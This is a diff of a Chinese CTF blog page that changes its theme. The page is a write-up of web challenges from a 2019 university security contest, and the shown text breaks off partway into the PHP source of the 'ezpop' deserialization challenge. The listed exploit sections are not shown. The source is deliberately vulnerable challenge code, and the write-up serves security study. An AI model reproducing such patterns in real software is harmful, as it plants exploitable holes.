@@ -1,403 +1,786 @@
+
+
 <!DOCTYPE html>
-<html lang=zh>
+<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
+
+
+
 <head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="前言周六要期末考了，抽空拿学长(大佬级别，膜一波)wp细细揣摩复现.解决完审计题ezpop,未解决只能考完试在搞了 ezpop给了源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707">
-<meta property="og:type" content="article">
-<meta property="og:title" content="2019 高校网络信息安全管理运维挑战赛web部分题解">
-<meta property="og:url" content="http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/index.html">
-<meta property="og:site_name" content="osword&#39;s blog">
-<meta property="og:description" content="前言周六要期末考了，抽空拿学长(大佬级别，膜一波)wp细细揣摩复现.解决完审计题ezpop,未解决只能考完试在搞了 ezpop给了源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/1574341160265.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/1574335729862.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/1574335770991.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/1574335780624.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/1574336091182.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/1574338058533.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/1574338381305.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/1574338352562.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/1574338584875.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/1574338562454.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/1574338721247.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/1574339010599.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/1574339335399.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/1574339772748.png">
-<meta property="article:published_time" content="2019-11-21T14:06:03.000Z">
-<meta property="article:modified_time" content="2020-05-15T08:22:36.000Z">
-<meta property="article:author" content="osword">
-<meta property="article:tag" content="CTF">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/1574341160265.png">
-    
-    
-        
-          
-              <link rel="shortcut icon" href="/images/favicon.ico">
-          
-        
-        
-          
-            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-          
-        
-        
-          
-            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-          
-        
-    
-    <!-- title -->
-    <title>2019 高校网络信息安全管理运维挑战赛web部分题解</title>
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="osword">
+  <meta name="keywords" content="">
+  <title>2019 高校网络信息安全管理运维挑战赛web部分题解 - osword&#39;s blog</title>
 
-    <!-- persian styles -->
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
     
       
-<link rel="stylesheet" href="/css/rtl.css">
-
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/darcula.min.css" />
     
-    <!-- rss -->
-    
-    
-      <link rel="alternate" href="/true" title="osword&#39;s blog" type="application/atom+xml" />
-    
-<meta name="generator" content="Hexo 4.2.1"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="/2019/11/24/WRITEUP-2019NJUPT-web%E9%A2%98%E8%A7%A3/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" href="/2019/11/19/%E7%94%A8%E8%82%9D%E5%88%B7xss-quiz/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">上一篇</span>
-      <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&text=2019 高校网络信息安全管理运维挑战赛web部分题解" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&title=2019 高校网络信息安全管理运维挑战赛web部分题解" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&is_video=false&description=2019 高校网络信息安全管理运维挑战赛web部分题解" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=2019 高校网络信息安全管理运维挑战赛web部分题解&body=Check out this article: http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&title=2019 高校网络信息安全管理运维挑战赛web部分题解" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&title=2019 高校网络信息安全管理运维挑战赛web部分题解" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&title=2019 高校网络信息安全管理运维挑战赛web部分题解" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&title=2019 高校网络信息安全管理运维挑战赛web部分题解" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&name=2019 高校网络信息安全管理运维挑战赛web部分题解&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&t=2019 高校网络信息安全管理运维挑战赛web部分题解" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezpop"><span class="toc-number">2.</span> <span class="toc-text">ezpop</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">2.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#几个注意点"><span class="toc-number">2.2.</span> <span class="toc-text">几个注意点</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easybypass"><span class="toc-number">3.</span> <span class="toc-text">easybypass</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezupload"><span class="toc-number">4.</span> <span class="toc-text">ezupload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezwaf"><span class="toc-number">5.</span> <span class="toc-text">ezwaf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-1"><span class="toc-number">5.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezjava未解决"><span class="toc-number">6.</span> <span class="toc-text">ezjava未解决</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezcms未解决"><span class="toc-number">7.</span> <span class="toc-text">ezcms未解决</span></a></li></ol>
-    </div>
-  </span>
-</div>
-
-    
-    <div class="content index py4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle" itemprop="name headline">
-        2019 高校网络信息安全管理运维挑战赛web部分题解
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">osword's blog</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2019-11-21T14:06:03.000Z" itemprop="datePublished">2019-11-21</time>
-        
-      
-    </div>
-
-
-      
-
-      
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>
-    </div>
-
-
-      <span id="/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="leancloud_visitors" data-flag-title="2019 高校网络信息安全管理运维挑战赛web部分题解">
-    <em class="post-meta-item-text">阅读量 </em>
-    <i class="leancloud-visitors-count" data-index="/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"></span>
-    </div>
-
-  </header>
   
 
-  <div class="content" itemprop="articleBody">
-    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周六要期末考了，抽空拿学长(大佬级别，膜一波)wp细细揣摩复现.解决完审计题ezpop,未解决只能考完试在搞了</p>
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-11-21 22:06" pubdate>
+        2019年11月21日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      19
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">2019 高校网络信息安全管理运维挑战赛web部分题解</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周六要期末考了，抽空拿学长(大佬级别，膜一波)wp细细揣摩复现.解决完审计题ezpop,未解决只能考完试在搞了</p>
 <h1 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h1><p>给了源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line"></span><br><span class="line">    protected $store;</span><br><span class="line"></span><br><span class="line">    protected $key;</span><br><span class="line"></span><br><span class="line">    protected $expire;</span><br><span class="line"></span><br><span class="line">    public function __construct($store, $key &#x3D; &#39;flysystem&#39;, $expire &#x3D; null)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;key    &#x3D; $key;</span><br><span class="line">        $this-&gt;store  &#x3D; $store;</span><br><span class="line">        $this-&gt;expire &#x3D; $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function cleanContents(array $contents)</span><br><span class="line">    &#123;</span><br><span class="line">        $cachedProperties &#x3D; array_flip([</span><br><span class="line">            &#39;path&#39;, &#39;dirname&#39;, &#39;basename&#39;, &#39;extension&#39;, &#39;filename&#39;,</span><br><span class="line">            &#39;size&#39;, &#39;mimetype&#39;, &#39;visibility&#39;, &#39;timestamp&#39;, &#39;type&#39;,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        foreach ($contents as $path &#x3D;&gt; $object) &#123;</span><br><span class="line">            if (is_array($object)) &#123;</span><br><span class="line">                $contents[$path] &#x3D; 